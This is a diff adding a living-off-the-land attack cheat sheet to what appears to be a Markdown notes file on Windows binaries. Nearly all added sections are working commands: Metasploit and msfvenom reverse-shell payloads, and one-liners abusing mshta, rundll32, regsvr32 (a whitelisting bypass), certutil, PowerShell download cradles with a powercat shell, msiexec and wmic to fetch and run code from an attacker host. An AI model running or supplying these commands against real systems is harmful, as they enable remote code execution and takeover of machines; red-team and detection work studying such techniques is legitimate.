@@ -2,6 +2,7 @@
 
 ## Collections
 
+- Windows EXE / DLL files: http://www.saule-spb.ru/touch/windows_files.html
 - Living Off The Land Binaries and Scripts: https://lolbas-project.github.io/ li, https://github.com/LOLBAS-Project/LOLBAS
 - [https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/](https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
 
@@ -65,6 +66,125 @@ Displays information about Common Object File Format (COFF) binary files. You ca
 ## HTA
 
 Application where source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. An HTA executes without the constraints of the internet browser security model; it executes as a "fully trusted" application.
+
+## Mshta.exe (HTA)
+
+Running HTA( HTML Application) files
+
+```
+use exploit/windows/misc/hta_server
+msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
+msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
+msf exploit(windows/misc/hta_server) > exploit
+```
+```
+mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta
+```
+
+## Rundll32.exe
+
+Invoke a function exported from a DLL
+```
+use exploit/windows/smb/smb_delivery
+msf exploit(windows/smb/smb_delivery) > set srvhost 192.168.1.109
+msf exploit(windows/smb/smb_delivery) > exploit
+```
+```
+rundll32.exe \\192.168.1.109\vabFG\test.dll,0
+```
+
+## Regsvr32.exe
+
+- Register and unregister OLE controls, such as DLLs and ActiveX controls in the Windows Registry
+- installed in the %systemroot%\System32
+- Windows XP and later
+- Regsvr32 uses “squiblydoo” technique for bypassing application whitelisting
+- Able to request a .sct file and then execute the included PowerShell command inside
+
+```
+Syntax: Regsvr32 [/s][/u] [/n] [/i[:cmdline]] <dllname>
+
+/u – Unregister server
+/i – Call DllInstall passing it an optional [cmdline]; when it is used with /u, it calls dll to uninstall
+/n – do not call DllRegisterServer; this option must be used with /i
+/s – Silent; display no message boxes
+```
+
+```
+use exploit/multi/script/web_delivery
+msf exploit (web_delivery)>set target 3
+msf exploit (web_delivery)> set payload windows/meterpreter/reverse_tcp
+msf exploit (web_delivery)> set lhost 192.168.1.109
+msf exploit (web_delivery)>set srvhost 192.168.1.109
+msf exploit (web_delivery)>exploit
+```
+
+```
+regsvr32 /s /n /u /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll
+```
+- https://gist.github.com/coh7eiqu8thaBu/809f49aa24ace2b9f326ab419f7b124a
+- https://web.archive.org/web/20170419145048/http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html
+- https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/
+
+## Certutil.exe
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe
+
+certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
+```
+
+## Powershell.exe
+
+```
+git clone https://github.com/besimorhino/powercat.git
+python -m SimpleHTTPServer 80
+
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
+```
+
+## Batch Files
+
+```
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat
+
+powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
+```
+
+## Cscript
+
+```
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs > 1.vbs
+script.exe "test.vbs"
+
+powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
+```
+
+## Msiexec.exe
+
+- Install MSI packages
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi
+
+msiexec /q /i http://192.168.1.109/1.msi
+```
+
+## Wmic.exe
+
+- WMI command-line interface that is used for a variety of administrative functions for local and remote machine
+- can invoke XSL script (eXtensible Stylesheet Language)
+
+koadic:
+```
+use stager/js/wmic
+set SRVHOST 192.168.1.107
+run
+```
+
+```
+wmic os get /FORMAT:"http://192.168.1.107:9996/g8gkv.xsl"
+```
 
 ## Prefetch Files Created
 
